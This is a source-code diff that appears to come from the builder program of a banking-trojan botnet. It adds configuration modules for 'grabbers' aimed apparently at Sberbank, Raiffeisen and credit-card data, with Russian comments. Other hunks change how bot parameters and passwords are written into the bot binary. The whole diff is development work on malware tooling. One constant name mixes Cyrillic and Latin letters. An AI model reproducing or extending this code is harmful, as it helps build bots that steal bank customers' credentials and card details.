@@ -15,6 +15,9 @@
 #include "VideoRecorder.h"
 #include "FgrFilters.h"
 #include "AzConfig.h"
+#include "Sber.h"
+#include "Rafa.h"
+#include "cc.h"
 
 //---------------------------------------------------------------------------
 
@@ -189,11 +192,14 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
 
 	TFileStream* S = new TFileStream(FileName, fmOpenRead);
+	try {
+		FFile->LoadFromStream(S);
+		FFile->Position = 0;
+	} __finally {
+		delete S;
+	}
 
-	FFile->LoadFromStream(S);
-    FFile->Position = 0;
 
-	delete S;
 
 	FSourceFileName = FileName;
 	UpdateResultFileName(false);
@@ -246,12 +252,15 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
         Message(Status_WriteParams);
 
 		// Записываем параметры
-		for (int i = 0; i < FParams->Count; i++)
+		DWORD Count   = FParams->Count;
+		PCHAR Buf     = (PCHAR)Mem->Memory;
+		DWORD BufSize = Mem->Size;
+		for (int i = 0; i < Count; i++)
 		{
 			TBotParam* Param = (TBotParam*)FParams->Items[i];
 			if (!Param->Active) continue;
 
-			WriteParametr((PCHAR)Mem->Memory, Mem->Size, Param);
+			WriteParametr(Buf, BufSize, Param);
 		}
 
 
@@ -607,6 +616,17 @@ void __fastcall TBotBuilder::InitializeModules()
 	Module = AddModule(Module_AzConfig);
 	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "Хосты системы AZ");
 	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "Хосты Java скриптов системы AZ");
+
+	// Настройки грабера сбер
+	Module = AddModule(Module_SberHosts);
+	Module->AddParam(true, SBERHOSTS_PARAM_ENCRYPTED, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, "Хосты грабера SBER");
+
+
+	Module = AddModule(Module_RafaHosts);
+	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "Хосты грабера RAFA");
+
+	Module = AddModule(Module_CCHosts);
+	Module->AddParam(true, ССHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "Хосты грабера CC");
 }
 
 
@@ -890,7 +910,7 @@ void __fastcall TBotParam::LoadFromStrings(TStrings *Strings)
 bool __fastcall TBotParam::Write(PCHAR Buf, DWORD BufSize)
 {
 	// Функция записывает своё значение в буфер
-    return DoWrite(Buf, BufSize, FData, FDataSize);
+    return DoWrite(Buf, BufSize, FData, FSize);
 }
 
 
@@ -949,13 +969,13 @@ bool __fastcall TBotPassword::Write(PCHAR Buf, DWORD BufSize)
 			throw Exception(Error_BigPassword);
 
         m_memset(Key.c_str(), 0, FRealSize);
-		m_memcpy(Key.c_str(), Str, Size + 1);
+		m_memcpy(Key.c_str(), Str, Size);
 
 		if (Encrypted)
 			Decrypt(Key.c_str(), Key.c_str());
     }
 
-    DoWrite(Buf, BufSize, Key.c_str(), FRealSize);
+    DoWrite(Buf, BufSize, Key.c_str(), Key.Length());
 }
 
 
